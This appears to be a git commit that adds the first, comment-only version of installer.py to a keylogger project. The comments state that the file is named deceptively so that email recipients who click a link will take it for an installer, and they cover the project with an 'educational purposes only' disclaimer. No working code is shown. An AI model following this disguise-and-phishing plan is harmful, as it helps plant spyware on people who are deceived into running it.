c6e375e0ae4ca1701e176055252cae284ce7f25a
bradysm <bradysm@vt.edu>
2019-06-17 23:37:31 -0400

    created the basic keylogger files

---
+++ installer.py
@@ -0,0 +1,8 @@
+# disclaimer - this program is for educational purposes only
+#   any use of this program for malicious reasons falls completly under your risk
+#   and I will take no fault for your actions.
+
+# this file is named installer for deceptive reasons
+# It will act like an installation script when people click on a link in
+# an email. If the person has a mac, then they will have python natively
+# and this script will run fine. I will have to look into ways to run on windows
